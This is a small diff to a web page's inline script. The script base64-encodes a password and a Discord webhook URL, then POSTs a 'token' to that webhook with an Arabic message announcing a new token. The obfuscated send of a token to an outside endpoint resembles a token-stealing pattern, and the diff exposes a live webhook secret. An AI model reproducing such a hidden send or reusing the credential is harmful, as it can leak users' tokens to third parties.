@@ -70,7 +70,7 @@
   </div>
 
   <script>
-    const encPass = "QWhtZWQ="; // 
+    const encPass = "QWhtZWQ="; 
     const encWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3ODAzNjczODc1MTk4Nzg5NC8xM0hETkNXX2pGWk10MU9qR2JxZDhWV0ZWZzlNcFhCS1VuZDBNSlJ1OHVRNERYbmdmTU5NdXR4MWRqQTEyRTk3UXgzZg==";
 
     function b64d(s) {
@@ -124,7 +124,7 @@
       fetch(b64d(encWebhook), {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: "🔑 التوكن: " + token })
+        body: JSON.stringify({ content: `تم اعطائك توكن جديد : ${token}` })
       });
     }
 
